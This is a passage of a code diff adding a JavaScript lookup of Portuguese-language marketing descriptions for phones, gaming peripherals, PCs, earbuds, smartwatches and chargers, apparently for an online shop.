+• Tela Super AMOLED de 6.5 polegadas: Cores vibrantes e brilho de até 1.000 nits para uma visualização clara mesmo sob o sol.
+• Taxa de Atualização de 120Hz: Navegação ultra-fluida e transições suaves em vídeos e jogos.
+• Câmara de 50MP com OIS: Tira fotos nítidas e grava vídeos estáveis sem tremores, graças à estabilização ótica de imagem.
+• Processador Octa-core Potente: Desempenho ágil para o dia a dia e suporte à conectividade 5G para downloads rápidos.
+• Som Estéreo com Dolby Atmos: Experiência de áudio imersiva para as tuas músicas e filmes favoritos.
+• Bateria de 5.000 mAh: Energia que dura até dois dias, com suporte a carregamento super-rápido.
+• Segurança Samsung Knox: Proteção de dados desde o momento em que ligas o aparelho.`,
+
+    "galaxy a15": `O Galaxy A15 oferece o essencial com qualidade Samsung, sendo perfeito para quem quer eficiência, uma tela excelente e bateria de longa duração.
+• Tela Super AMOLED de 6.5 polegadas: Tecnologia Vision Booster que garante clareza e cores vivas mesmo em ambientes externos.
+• Performance Confiável: Processador otimizado para as tarefas do dia a dia, redes sociais e streaming sem interrupções.
+• Sistema de Câmara Tripla: Sensor principal de 50MP para capturar momentos com detalhe, além de lentes Ultra-wide e Macro.
+• Bateria que Acompanha o teu Ritmo: 5.000 mAh de capacidade para garantir que não ficas sem carga quando mais precisas.
+• Design Moderno e Ergonómico: Acabamento elegante com moldura lateral plana que facilita a pegada e o uso prolongado.
+• Armazenamento Expansível: Espaço de sobra para as tuas fotos e apps, com suporte para cartão microSD.
+• Atualizações de Segurança: Mantém-te protegido com as constantes atualizações de sistema da Samsung.`,
+
+        "xiaomi 14 ultra": `O Xiaomi 14 Ultra redefine a fotografia móvel com a lendária ótica Leica e um desempenho sem precedentes para profissionais.
+• Ótica Leica Summilux: Sistema de quatro câmeras de 50MP com sensor principal de 1 polegada e abertura variável para fotos cinematográficas.
+• Lente Periscópica de 120mm: Capture detalhes à distância com nitidez absoluta e zoom de altíssima qualidade.
+• Tela AMOLED C8 WQHD+: Painel de 6.73 polegadas com 120Hz e brilho de pico de 3.000 nits para uma visualização perfeita.
+• Processador Snapdragon 8 Gen 3: O chip mais potente da atualidade, garantindo velocidade máxima em qualquer tarefa ou jogo.
+• Xiaomi Shield Glass: Proteção ultra-resistente contra quedas e arranhões, com estrutura em alumínio de alta resistência.
+• Gravação de Vídeo 8K em todas as câmeras: Qualidade profissional com suporte a Log de 10 bits e MasterCinema.
+• Carregamento Ultra-Rápido: 90W com fio e 80W sem fio, carregando a bateria de 5.000 mAh em minutos.
+• Resistência IP68: Proteção total contra água e poeira.`,
+
+    "xiaomi 14": `O Xiaomi 14 traz o poder de um topo de gama num formato compacto e elegante, sem comprometer a performance ou a qualidade das câmeras.
+• Lentes Ópticas Leica Summilux: Sensor principal Light Fusion 900 de alta faixa dinâmica para fotos incríveis em qualquer iluminação.
+• Design Compacto e Premium: Tela de 6.36 polegadas com bordas ultra-finas, perfeito para o uso confortável com uma mão.
+• Tela LTPO AMOLED Pro: Taxa de atualização adaptativa de 1 a 120Hz para máxima fluidez e economia de bateria.
+• Processador Snapdragon 8 Gen 3: Desempenho de elite para multitarefa pesada e processamento de imagem por IA.
+• Sistema de Refrigeração IceLoop: Tecnologia avançada para manter o smartphone frio mesmo durante sessões longas de jogos.
+• Carregamento HyperCharge de 90W: Vá de 0 a 100% em tempo recorde para não perder nenhum momento do dia.
+• Som Surround Dolby Atmos: Alto-falantes estéreo de alta fidelidade para uma experiência de áudio imersiva.
+• Resistência à Água e Poeira (IP68): Durabilidade garantida para enfrentar o dia a dia.`,
+
+        "xiaomi 13t": `O Xiaomi 13T entrega uma experiência de topo de gama com foco em fotografia artística e uma tela que redefine a fluidez.
+• Co-engenharia com a Leica: Sistema de câmera tripla com lentes profissionais que capturam cores autênticas e detalhes cinematográficos.
+• Tela CrystalRes AMOLED de 144Hz: Visualização ultra-fluida com uma nitidez incrível, ideal para vídeos e jogos de alta performance.
+• Processador MediaTek Dimensity 8200-Ultra: Desempenho potente com eficiência energética superior para o dia a dia.
+• Resistência à Água e Poeira IP68: Durabilidade de nível premium para você não se preocupar com imprevistos ou chuva.
+• Carregamento Turbo de 67W: Carregue sua bateria de 5.000 mAh rapidamente e tenha energia para o dia todo em poucos minutos.
+• Estilos Fotográficos Leica: Escolha entre os modos Authentic e Vibrant para dar um toque profissional único às suas fotos.
+• Som Dolby Atmos: Alto-falantes duplos que proporcionam uma experiência sonora imersiva e clara.`,
+
+    "poco f6": `O Poco F6 é o verdadeiro "flagship killer", focado em oferecer a velocidade mais bruta do mercado para gamers e usuários exigentes.
+• Processador Snapdragon 8s Gen 3: O mais novo monstro de performance da Qualcomm, feito para rodar qualquer jogo no ultra sem travamentos.
+• Tecnologia WildBoost Optimization 3.0: Software otimizado para manter altas taxas de quadros e estabilidade total durante partidas intensas.
+• Tela Flow AMOLED de 1.5K: Bordas ultra-finas e brilho de pico altíssimo, garantindo uma imersão total em jogos e filmes.
+• Carregamento HyperCharge de 90W: Uma das velocidades de carregamento mais rápidas da categoria, recarregando a bateria em tempo recorde.
+• Sistema de Resfriamento LiquidCool 4.0: Tecnologia avançada de dissipação de calor para manter o aparelho frio mesmo sob estresse máximo.
+• Câmera Principal de 50MP com OIS: Estabilização ótica para fotos nítidas e vídeos estáveis, capturando momentos com rapidez.
+• Design Fino e Leve: Potência extrema em um corpo ergonômico, facilitando o uso por longas horas seguidas.`,
+
+        "poco f5": `O Poco F5 é reconhecido como o mestre da velocidade, trazendo um desempenho de nível flagship para quem busca potência sem concessões.
+• Processador Snapdragon 7+ Gen 2: Uma arquitetura poderosa que oferece velocidade comparável à linha 8, ideal para jogos pesados e multitarefa.
+• Tela Flow AMOLED de 120Hz: Bordas extremamente finas para uma imersão total e cores vibrantes com suporte a Dolby Vision.
+• Tecnologia LiquidCool 2.0: Sistema de resfriamento eficiente que evita o superaquecimento mesmo durante longas sessões de gameplay.
+• Câmera Tripla de 64MP com OIS: Estabilização óptica de imagem para fotos nítidas e vídeos fluidos, eliminando borrões de movimento.
+• Bateria de 5.000 mAh e Carregamento de 67W: Tenha carga para o dia todo e recupere 100% da bateria em pouco mais de 45 minutos.
+• Design Leve e Moderno: Um aparelho potente que mantém a elegância e o conforto térmico nas mãos.
+• Som Estéreo Duplo: Áudio imersivo para uma experiência completa em filmes, séries e jogos de última geração.`,
+
+    "redmi note 13 pro": `O Redmi Note 13 Pro eleva o patamar da linha média com uma câmera de resolução ultra-alta e uma tela que impressiona pela nitidez.
+• Câmera Principal de 200MP com OIS: Capture fotos com um nível de detalhe profissional e zoom sem perda de qualidade, mesmo em condições de luz baixa.
+• Tela AMOLED de 1.5K e 120Hz: Uma resolução superior que oferece mais clareza e proteção ocular avançada para horas de uso.
+• Processador de Alta Performance: Otimizado para garantir que a interface seja fluida e que os aplicativos abram instantaneamente.
+• Design Premium com Bordas Reduzidas: Visual sofisticado com acabamento de alta qualidade que se destaca em qualquer lugar.
+• Carregamento Turbo de 67W: Carregue seu smartphone em tempo recorde e aproveite a bateria de longa duração para sua rotina intensa.
+• Resistência à Poeira e Respingos: Classificação IP54 para garantir durabilidade contra os imprevistos do dia a dia.
+• Sensor de Digital na Tela: Segurança biométrica rápida, moderna e integrada diretamente no painel AMOLED.`,
+
+      "redmi note 13": `O Redmi Note 13 é o equilíbrio perfeito entre estilo e tecnologia, oferecendo uma experiência visual de cinema e câmeras poderosas.
+• Tela AMOLED de 120Hz: Brilho intenso e fluidez absurda para navegar nas redes sociais e assistir seus vídeos favoritos com cores vibrantes.
+• Câmera Tripla de 108MP: Fotos ultra-nítidas com inteligência artificial que captura cada detalhe, mesmo em ambientes com luz desafiadora.
+• Design Elegante e Fino: Bordas ultra-finas que garantem um visual moderno e uma pegada confortável para o uso o dia todo.
+• Processador de Alta Performance: Otimizado para garantir que o sistema rode sem travamentos e com ótima eficiência energética.
+• Bateria de 5.000 mAh: Energia de sobra para acompanhar sua rotina, com suporte a carregamento rápido para você não ficar preso à tomada.
+• Sensor de Digital na Tela: Desbloqueio rápido, seguro e tecnológico diretamente no painel AMOLED.
+• Resistência IP54: Proteção garantida contra poeira e respingos de água para maior durabilidade.`,
+
+    "redmi 13c": `O Redmi 13C é o campeão de custo-benefício, entregando um design renovado, tela grande e bateria que dura muito.
+• Tela de 6.74 polegadas com 90Hz: Uma tela gigante para você mergulhar nos seus conteúdos com transições suaves e proteção para os olhos.
+• Câmera Tripla de 50MP com IA: Capture momentos especiais com clareza e utilize os novos filtros de câmera estilo "Filme" para fotos artísticas.
+• Design Moderno e Colorido: Acabamento sofisticado que brilha conforme a luz, sendo um dos aparelhos mais bonitos da categoria.
+• Processador Octa-core Potente: Ideal para rodar seus apps do dia a dia, como WhatsApp, Instagram e YouTube, com total fluidez.
+• Bateria Monstruosa: Feito para durar mais de um dia inteiro longe do carregador, suportando carregamento de 18W.
+• Memória Expansível: Nunca mais se preocupe com falta de espaço para suas fotos e documentos.
+• Vidro Corning Gorilla Glass: Proteção extra para a tela contra riscos e pequenos impactos do cotidiano.`,
+
+       "poco x6 pro": `O Poco X6 Pro é um verdadeiro monstro de performance, equipado com tecnologias de última geração para quem busca a velocidade máxima em jogos e apps.
+• Processador Dimensity 8300-Ultra: Uma potência absurda que redefine o que um smartphone intermediário premium pode fazer, alcançando pontuações altíssimas em benchmarks.
+• Tela CrystalRes Flow AMOLED de 120Hz: Resolução superior ao Full HD com bordas ultra-finas, oferecendo uma imersão visual sem precedentes e brilho de pico de 1800 nits.
+• Tecnologia WildBoost Optimization 2.0: Ajustes inteligentes de software que garantem que o jogo rode liso, sem quedas de frames e com resposta ao toque instantânea.
+• Carregamento Turbo de 67W: Recarregue a bateria de 5.000 mAh em tempo recorde e tenha energia para maratonas de jogos e vídeos.
+• Câmera Tripla de 64MP com OIS: Estabilização dupla (óptica e eletrônica) para vídeos em 4K extremamente estáveis e fotos nítidas mesmo em movimento.
+• Sistema de Resfriamento LiquidCool 3.0: Área de dissipação de calor ampliada para manter o dispositivo frio mesmo sob uso intenso.
+• Design Moderno e Ergonômico: Acabamento premium que combina leveza e resistência, disponível em cores vibrantes que são a marca da linha Poco.`,
+
+    "redmi a3": `O Redmi A3 traz um design revolucionário e elegante para a categoria de entrada, focado em quem busca um aparelho bonito, funcional e com bateria gigante.
+• Design Premium Deco: Um visual traseiro inspirado em câmeras profissionais, com acabamento que simula couro ou vidro, destacando-se de qualquer outro aparelho básico.
+• Tela Grande de 6.71 polegadas com 90Hz: Experiência de visualização ampla e fluida, ideal para navegar nas redes sociais e assistir vídeos com conforto.
+• Bateria de 5.000 mAh: Energia de sobra para durar o dia inteiro e até o dia seguinte, permitindo que você esqueça o carregador em casa.
+• Sensor de Digital Lateral: Segurança biométrica rápida e conveniente, integrada ao botão de ligar para facilitar o acesso.
+• Processador Octa-core Eficiente: Desempenho equilibrado para as tarefas essenciais do dia a dia, como WhatsApp, YouTube e navegação na web.
+• Câmera Dupla com IA: Capture momentos com clareza e utilize os modos inteligentes para melhorar suas fotos automaticamente.
+• Armazenamento Expansível: Suporte para cartão microSD de até 1TB, garantindo que você nunca fique sem espaço para suas fotos e arquivos importantes.`,
+
+       "edge 50 ultra": `O Motorola Edge 50 Ultra é a união perfeita entre arte e tecnologia avançada, com acabamentos exclusivos e o processador mais potente da atualidade.
+• Design em Madeira Real e Vegan Leather: Acabamento sofisticado e único, com certificação IP68 de resistência total à água e poeira.
+• Tela pOLED Super HD de 6.7 polegadas: Taxa de atualização de 144Hz e cores validadas pela Pantone para uma precisão visual absoluta.
+• Sistema de Câmeras com IA: Sensor principal de 50MP, ultrawide e uma poderosa lente teleobjetiva com zoom de até 100x.
+• Processador Snapdragon 8s Gen 3: Performance de última geração para lidar com qualquer aplicativo, jogo ou inteligência artificial sem esforço.
+• Carregamento TurboPower de 125W: A recarga mais rápida da Motorola, que entrega energia para o dia todo em apenas alguns minutos.
+• Som Estéreo com Dolby Atmos: Experiência de áudio imersiva e clara, com suporte a rastreamento de cabeça (Head Tracking).
+• Inteligência Artificial Moto AI: Otimização automática de fotos, vídeos e gerenciamento inteligente de bateria.`,
+
+    "razr 50 ultra": `O Motorola Razr 50 Ultra reinventa o conceito de smartphone dobrável com a maior e mais inteligente tela externa da categoria.
+• Tela Externa Inteligente de 4.0 polegadas: Use quase todos os apps, responda mensagens e tire fotos sem precisar abrir o aparelho.
+• Tela Principal pOLED de 6.9 polegadas: Dobrável imersivo com taxa de atualização de 165Hz para uma fluidez incomparável.
+• Design Icônico e Compacto: Acabamento em cores vibrantes Pantone e couro vegano, com dobradiça redesenhada para ser quase invisível.
+• Sistema de Câmera Dupla de 50MP: Lentes de alta resolução que permitem fotos e vídeos estáveis, usando o celular dobrado como tripé.
+• Processador Snapdragon 8s Gen 3: Desempenho de elite para multitarefa pesada e processamento rápido de inteligência artificial.
+• Moto AI e Google Gemini: Assistente inteligente integrado para facilitar sua rotina diretamente na tela externa.
+• Resistência à Água IPX8: Proteção contra imersão acidental, garantindo durabilidade para o seu smartphone dobrável.`,
+
+        "edge 40": `O Motorola Edge 40 combina um design ultra-fino com uma performance poderosa, sendo um dos aparelhos mais elegantes e confortáveis de segurar.
+• Design com Bordas Infinitas: Tela curva que se funde com a moldura de alumínio e acabamento traseiro em Vegan Leather (couro vegano).
+• Proteção Contra Água IP68: Resistência total à imersão em água e poeira, oferecendo tranquilidade em qualquer situação do dia a dia.
+• Tela pOLED de 6.55 polegadas com 144Hz: Uma das taxas de atualização mais rápidas do mercado para uma fluidez absoluta em jogos e navegação.
+• Câmera de 50MP com a Maior Abertura (f/1.4): Capture fotos incríveis mesmo no escuro total, com o sensor que mais recebe luz na categoria.
+• Processador MediaTek Dimensity 8020: Desempenho de alta velocidade e conectividade 5G para multitarefa sem engasgos.
+• Carregamento TurboPower de 68W: Recupere a carga para o dia inteiro em apenas 15 minutos de tomada.
+• Som Dolby Atmos: Experiência de áudio tridimensional com alto-falantes estéreo para uma imersão completa em filmes e músicas.`,
+
+    "edge 40 neo": `O Motorola Edge 40 Neo traz cores vibrantes validadas pela Pantone e um design sofisticado com recursos de topo de gama para o segmento intermediário.
+• Cores Exclusivas Pantone: Acabamentos únicos em cores como Caneel Bay e Black Beauty, desenvolvidos para quem busca estilo e personalidade.
+• Tela Curva pOLED de 144Hz: Cores cinematográficas de 10 bits e contraste infinito em uma tela que ocupa toda a frente do aparelho.
+• Resistência à Água IP68: Mesmo sendo um modelo intermediário premium, oferece a mesma proteção contra água que os modelos mais caros.
+• Sensor de Câmera de 50MP com Ultra Pixel: Tecnologia que garante fotos nítidas e brilhantes em qualquer condição de iluminação, com foco instantâneo.
+• Bateria de Longa Duração (5.000 mAh): Energia de sobra para sua rotina, acompanhada pelo carregamento rápido TurboPower.
+• Desempenho Otimizado: Processador eficiente para redes sociais, vídeos e jogos, mantendo o smartphone sempre fluido.
+• Compromisso Sustentável: Embalagem 100% livre de plástico e construído com materiais que respeitam o meio ambiente.`,
+
+        "moto g85": `O Moto G85 eleva o patamar da linha G com um design premium de tela curva e uma experiência visual que antes só existia nos modelos mais caros.
+• Tela pOLED Curva de 6.67 polegadas: Bordas infinitas com taxa de 120Hz e brilho intenso, proporcionando uma imersão cinematográfica na palma da sua mão.
+• Design Ultrafino e Sofisticado: Acabamento premium em Vegan Leather (couro vegano) que oferece um toque suave e uma pegada extremamente confortável.
+• Câmera de 50MP com Sensor Sony LYTIA™ 600: Fotos brilhantes em qualquer iluminação e estabilização óptica (OIS) para vídeos sem tremores.
+• Processador Snapdragon de Última Geração: Desempenho ágil e eficiente para rodar seus apps e jogos favoritos com fluidez total e tecnologia 5G.
+• Bateria de 5.000 mAh: Energia de longa duração que acompanha o seu ritmo por mais de um dia, com carregamento TurboPower.
+• Som Estéreo com Dolby Atmos: Alto-falantes potentes que entregam graves profundos e vozes nítidas para uma experiência de áudio completa.
+• Memória Generosa: Espaço de sobra para todas as suas fotos, vídeos e aplicativos, garantindo que o sistema nunca fique lento.`,
+
+    "moto g73": `O Moto G73 é o equilíbrio perfeito para quem busca velocidade 5G, fotos de alta qualidade e um desempenho sólido para o dia a dia.
+• Sensor de 50MP com Tecnologia Ultra Pixel: Captura 1.5x mais luz, entregando fotos nítidas e detalhadas mesmo em ambientes escuros.
+• Tela de 6.5 polegadas FHD+ com 120Hz: Imagens super nítidas e uma navegação fluida, ideal para quem consome muito conteúdo de vídeo e redes sociais.
+• Processador MediaTek Dimensity 930: Performance otimizada para a rede 5G, garantindo downloads ultrarrápidos e multitarefa eficiente sem travamentos.
+• Som Espacial e Dolby Atmos: Sinta o som vindo de todas as direções com os alto-falantes estéreo de alta fidelidade.
+• Carregamento TurboPower de 30W: Recarregue seu smartphone rapidamente e ganhe horas de uso em apenas alguns minutos de tomada.
+• Design Elegante e Resistente: Acabamento moderno que repele água, protegendo o aparelho contra respingos e derramamentos acidentais.
+• Segurança Avançada: Proteção completa dos seus dados com o Moto Secure, garantindo que suas informações fiquem sempre privadas.`,
+
+       "moto g54": `O Moto G54 é o smartphone ideal para quem procura entretenimento imersivo, velocidade 5G e uma bateria que não te deixa na mão.
+• Tela de 6.5 polegadas FHD+ com 120Hz: Experiência visual de alta definição com uma fluidez impressionante, ideal para streaming e jogos.
+• Sistema de Câmara de 50MP com OIS: Tira fotos nítidas mesmo em condições de pouca luz e grava vídeos estáveis graças à estabilização ótica de imagem.
+• Performance 5G Veloz: Processador MediaTek Dimensity 7020 que garante que as tuas apps abram instantaneamente e a navegação seja super rápida.
+• Som Dolby Atmos e Estéreo: Colunas duplas que proporcionam um áudio multidimensional com graves mais profundos e vozes claras.
+• Bateria de 5.000 mAh: Longa duração para o teu dia inteiro, acompanhada por um carregamento TurboPower para rapidez na recarga.
+• Design Elegante e Resistente: Acabamento sofisticado com proteção contra salpicos de água para maior durabilidade no quotidiano.
+• Grande Capacidade de Armazenamento: Espaço de sobra para todas as tuas fotos, vídeos e jogos, com sistema sempre fluido.`,
+
+    "moto g34": `O Moto G34 redefine o conceito de entrada premium, trazendo um design luxuoso em couro vegan e performance 5G acessível.
+• Tela de 6.5 polegadas com 120Hz: Navegação suave e cores vibrantes numa tela que se adapta perfeitamente ao teu conteúdo favorito.
+• Design em Vegan Leather: Acabamento premium que não só é bonito de se ver, mas também oferece uma pegada confortável e sofisticada.
+• Processador Snapdragon 5G: Velocidade de última geração para que possas descarregar conteúdos e jogar online sem atrasos.
+• Câmara Principal de 50MP com IA: Captura fotos detalhadas automaticamente otimizadas pela inteligência artificial da Motorola.
+• Bateria Monstruosa de 5.000 mAh: Energia garantida para horas de diversão, redes sociais e trabalho sem precisar de procurar uma tomada.
+• Som Estéreo e Dolby Atmos: Qualidade sonora de alta fidelidade que te coloca no centro da ação, seja em filmes ou músicas.
+• Interface Moto Simples e Segura: Experiência Android limpa com gestos inteligentes e proteção total para os teus dados pessoais.`,
+
+      "moto g24": `O Moto G24 combina um design sofisticado com performance essencial, sendo a escolha perfeita para quem quer estilo e eficiência no dia a dia.
+• Design Premium e Elegante: Construído com materiais de alta qualidade e acabamento fosco que repele impressões digitais, garantindo um visual sempre limpo.
+• Tela de 6.6 polegadas com 90Hz: Navegação fluida e transições suaves em uma tela brilhante com modo de seleção inteligente de taxa de atualização.
+• Câmera de 50MP com Tecnologia Quad Pixel: Tire fotos vibrantes em qualquer situação, com 4x mais sensibilidade à luz para fotos noturnas mais claras.
+• RAM Inteligente (RAM Boost): O sistema utiliza parte do armazenamento para aumentar a memória RAM, garantindo que os apps abram mais rápido e não travem.
+• Bateria de 5.000 mAh: Desfrute de horas de música, vídeos e chamadas com uma bateria feita para durar mais de um dia inteiro.
+• Som Dolby Atmos: Alto-falantes estéreo que proporcionam uma clareza sonora incrível, seja ouvindo música ou assistindo suas séries.
+• Processador Octa-core: Potência ideal para as tarefas diárias, garantindo uma experiência de uso sem estresse.`,
+
+    "moto e13": `O Moto E13 é o smartphone fino, leve e inteligente, projetado para oferecer o essencial com um toque de modernidade e excelente custo-benefício.
+• Design Fino e Leve: Fácil de carregar e usar com uma mão só, com cores modernas e acabamento resistente a respingos de água.
+• Tela HD+ de 6.5 polegadas: Imagens nítidas e brilhantes para você aproveitar seus conteúdos favoritos com conforto visual.
+• Áudio Multidimensional com Dolby Atmos: Sinta o som vindo de todos os lados com uma imersão sonora que você só encontra em modelos mais caros.
+• Bateria de Longa Duração: A capacidade de 5.000 mAh garante que você fique conectado por muito mais tempo sem precisar de uma tomada.
+• Câmera com Inteligência Artificial: Capture fotos prontas para as redes sociais com recursos inteligentes que otimizam o foco e o brilho automaticamente.
+• Desempenho Ágil: Processador eficiente que mantém o sistema fluido para navegar na web, usar o WhatsApp e assistir vídeos sem complicações.
+• Conectividade Wi-Fi de Banda Dupla: Suporte a redes de 2.4 GHz e 5 GHz para uma internet mais estável e rápida onde quer que você esteja.`,
+
+       "monitor curvo 180hz": `Eleve o seu jogo para o nível profissional com o Monitor Gamer Curvo de 180Hz, projetado para total imersão e vantagem competitiva.
+• Taxa de Atualização de 180Hz: Movimentos ultra-suaves que eliminam o rastro de imagem (ghosting), permitindo reações instantâneas em jogos de FPS e ação.
+• Curvatura R1500: Design ergonómico que envolve o seu campo de visão, reduzindo o cansaço ocular e aumentando a profundidade visual.
+• Tempo de Resposta de 1ms: Resposta imediata aos seus comandos, garantindo que cada clique seja registado sem atrasos.
+• Tecnologia Adaptive-Sync: Sincronização perfeita entre o monitor e a sua placa de vídeo, eliminando cortes na imagem (tearing).
+• Resolução Full HD com Painel VA: Cores vibrantes e contrastes profundos, com pretos mais intensos para uma qualidade de imagem superior.
+• Modos de Jogo Pré-configurados: Otimização instantânea de brilho e contraste para diferentes géneros de jogos (FPS, RTS, RPG).
+• Design Ultra-Slim com Bordas Infinitas: Perfeito para setups com múltiplos monitores, oferecendo uma visão contínua e elegante.`,
+
+    "cadeira gamer rgb": `A Cadeira Gamer RGB é o trono que todo o setup merece, combinando conforto extremo com um espetáculo de luzes personalizável.
+• Iluminação LED RGB Integrada: Centenas de modos de luz e cores controláveis por comando remoto, criando a atmosfera perfeita para as suas streams e jogatinas.
+• Ergonomia de Alta Performance: Encosto ajustável com inclinação de até 180 graus, permitindo que relaxe ou mantenha o foco total na partida.
+• Almofadas Cervical e Lombar Inclusas: Suporte extra para manter a postura correta e evitar dores após horas de uso intenso.
+• Revestimento em Couro PU Premium: Material durável, respirável e fácil de limpar, com acabamento de alta qualidade e costuras reforçadas.
+• Pistão a Gás de Classe 4: Suporte de peso robusto e ajuste de altura suave, garantindo segurança e estabilidade.
+• Apoios de Braço Ajustáveis: Configure a altura e o ângulo dos braços para encontrar a posição ideal para o seu teclado e rato.
+• Base de Estrela com Rodas Silenciosas: Movimentação suave em qualquer superfície sem arranhar o chão.`,
+
+      // Mouse Gamer 12k DPI
+    "mouse gamer 12k dpi": `Domine o campo de batalha com o Mouse Gamer de 12.000 DPI, projetado para oferecer precisão absoluta e rastreamento ultrarrápido.
+• Sensor Óptico de Alta Precisão: Ajuste a sensibilidade de 800 até 12.000 DPI para se adaptar perfeitamente ao seu estilo de jogo, seja FPS ou MOBA.
+• Switches de Alta Durabilidade: Botões projetados para suportar até 20 milhões de cliques, garantindo que você nunca perca um disparo crítico.
+• Iluminação RGB Customizável: Escolha entre milhões de cores e efeitos para combinar com o restante do seu setup.
+• Design Ergonômico e Leve: Formato pensado para reduzir a fadiga da mão durante maratonas de jogos, com laterais texturizadas para maior aderência.
+• Botões Laterais Programáveis: Configure macros e comandos rápidos para ganhar vantagem competitiva em qualquer partida.
+• Cabo Trançado Reforçado: Maior durabilidade e menos arrasto, permitindo movimentos mais livres e fluidos.`,
+
+    // PC Gamer Pichau
+    "pc gamer pichau": `O PC Gamer Pichau é a máquina definitiva para quem busca o máximo desempenho em jogos modernos com gráficos no ultra e alta taxa de quadros.
+• Configuração de Elite: Equipado com processador de última geração e placa de vídeo potente, pronto para rodar títulos como Warzone, GTA V e Cyberpunk.
+• Refrigeração Otimizada: Gabinete com excelente fluxo de ar e fans instalados para manter os componentes frios mesmo sob estresse máximo.
+• Armazenamento SSD Ultraveloz: Esqueça as telas de carregamento demoradas; inicie o Windows e seus jogos em poucos segundos.
+• Fonte de Alimentação com Selo 80 Plus: Eficiência energética e segurança total para os seus componentes contra oscilações de energia.
+• Memória RAM em Dual Channel: Performance dobrada para multitarefa, permitindo jogar, streamar e abrir diversas abas sem lentidão.
+• Design Gamer com Lateral em Vidro: Visualize todo o poder do seu hardware com iluminação interna e acabamento premium.`,
+
+       "neologic pc gamer": `O Neologic PC Gamer é sinónimo de potência bruta e fiabilidade, construído peça a peça para oferecer a melhor experiência em eSports e jogos AAA.
+• Performance Extrema: Equipado com hardware selecionado para garantir que nunca fiques para trás, seja em competições de alto nível ou em jogos de mundo aberto.
+• Engenharia de Refrigeração: Sistema de ventilação inteligente que mantém a temperatura estável, garantindo que o processador e a placa de vídeo trabalhem no máximo desempenho.
+• Estética Gamer Impecável: Gabinete moderno com painel lateral transparente e iluminação interna, transformando o seu PC na peça central do seu setup.
+• Componentes de Alta Qualidade: Motherboard e memórias escolhidas pela sua durabilidade e estabilidade, evitando ecrãs azuis ou lentidão em momentos críticos.
+• Pronto para o Futuro: Arquitetura que permite upgrades fáceis, para que a sua máquina possa evoluir conforme os novos lançamentos de jogos.
+• Velocidade SSD: Sistema operativo e jogos carregam em segundos, para que passes menos tempo a esperar e mais tempo a jogar.
+• Montagem Profissional: Organização de cabos (cable management) impecável, melhorando o fluxo de ar e o visual interno da máquina.`,
+
+      "airpods pro 2": `Os AirPods Pro (2.ª geração) elevam a experiência de áudio a um novo patamar, com cancelamento de ruído inteligente e um som mais rico e envolvente.
+• Chip H2 da Apple: O motor por trás da performance avançada, proporcionando agudos cristalinos e graves profundos com uma definição incrível.
+• Cancelamento Ativo de Ruído: Até 2x mais cancelamento de ruído que a versão anterior, silenciando o mundo exterior para um foco total na música.
+• Modo Transparência Adaptável: Permite ouvir o que se passa à tua volta enquanto reduz a intensidade de ruídos altos e repentinos.
+• Áudio Espacial Personalizado: Som que se adapta à geometria da tua orelha para uma experiência tridimensional única em filmes e músicas.
+• Estojo de Carregamento MagSafe: Agora com altifalante integrado para localização via "Encontrar" e entrada para fita de transporte.
+• Bateria de Longa Duração: Até 6 horas de áudio com uma única carga e até 30 horas totais com o estojo.
+• Resistência IPX4: Proteção contra suor e água tanto nos auriculares como no estojo, ideal para treinos e uso diário.`,
+
+    "galaxy watch 7": `O Galaxy Watch 7 combina o poder da Inteligência Artificial com um design premium para ser o parceiro definitivo na tua saúde e produtividade.
+• Sensor BioActive Avançado: Monitorização ultra-precisa da frequência cardíaca, oxigénio no sangue e níveis de stress em tempo real.
+• Insights com IA (Energy Score): Recebe uma pontuação diária baseada no teu sono e atividade física para saberes exatamente como está o teu corpo.
+• GPS de Dupla Frequência: Localização extremamente precisa mesmo em cidades com muitos prédios, ideal para monitorizar corridas e trilhos.
+• Ecrã Sapphire Crystal: Vidro de safira altamente resistente a riscos e quedas, mantendo o aspeto de novo por muito mais tempo.
+• Novo Processador 3nm: Desempenho mais rápido, fluido e com maior eficiência energética para que a bateria dure mais.
+• Análise de Composição Corporal: Mede a gordura corporal, massa muscular e água no organismo diretamente no pulso.
+• Ecossistema Galaxy Integrado: Controla a câmara do teu telemóvel, atende chamadas e responde a mensagens de forma instantânea.`,
+
+       "apple watch s9": `O Apple Watch Series 9 é o relógio mais poderoso da Apple, trazendo o novo chip S9 que permite uma interação mágica sem tocar na tela.
+• Novo Gesto de Toque Duplo: Atenda chamadas, pare cronômetros ou responda mensagens apenas tocando o indicador e o polegar duas vezes.
+• Chip S9 SiP: O processador mais rápido de sempre em um Apple Watch, garantindo animações ultra-fluidas e uma Siri muito mais veloz.
+• Tela Retina Sempre Ativa: Agora com brilho de até 2000 nits, facilitando a leitura mesmo sob a luz direta do sol forte.
+• Monitoramento Avançado de Saúde: Sensores de ECG, oxigênio no sangue, notificações de ritmo cardíaco irregular e monitoramento de ciclos com foco em saúde feminina.
+• Detecção de Acidentes: Tecnologia inteligente que detecta se você sofreu um acidente grave de carro e liga automaticamente para os serviços de emergência.
+• Integração Total Apple: Desbloqueie seu Mac automaticamente, encontre seu iPhone com precisão e controle sua música com um toque.
+• Design Sustentável: A primeira combinação de produto neutra em carbono da Apple, unindo tecnologia de ponta e respeito ao meio ambiente.`,
+
+    "power bank 10k": `O Power Bank de 10.000 mAh é o acessório indispensável para quem não pode ficar desconectado, oferecendo múltiplas cargas para o seu smartphone.
+• Alta Capacidade de 10.000 mAh: Energia suficiente para carregar um smartphone comum de 2 a 3 vezes por completo, garantindo autonomia o dia todo.
+• Carregamento Rápido Inteligente: Portas de alta saída que reconhecem o seu dispositivo e entregam a carga máxima suportada com total segurança.
+• Design Compacto e Portátil: Cabe facilmente no bolso ou na mochila, sendo o companheiro ideal para viagens, trabalho ou eventos longos.
+• Proteção Multiprotect: Sistema de segurança integrado contra sobrecarga, superaquecimento e curto-circuito, protegendo a vida útil da sua bateria.
+• Portas USB Duplas: Carregue até dois dispositivos simultaneamente, como o seu celular e o seu fone de ouvido, sem perder velocidade.
+• Indicador de LED de Carga: Saiba exatamente quanta energia resta no seu Power Bank através das luzes indicadoras de nível de bateria.
+• Compatibilidade Universal: Funciona perfeitamente com iPhone, Android, tablets, smartwatches e qualquer dispositivo carregável via USB.`,
+
+       "carregador 20w": `O Carregador de 20W Ultra Rápido é o acessório indispensável para quem não tem tempo a perder e precisa de uma carga eficiente e segura.
+• Tecnologia Fast Charge: Carrega o teu smartphone até 50% em apenas 30 minutos, ideal para aqueles momentos de pressa antes de sair de casa.
+• Porta USB-C de Alta Performance: Compatível com os padrões mais modernos de carregamento, garantindo estabilidade e velocidade constante.
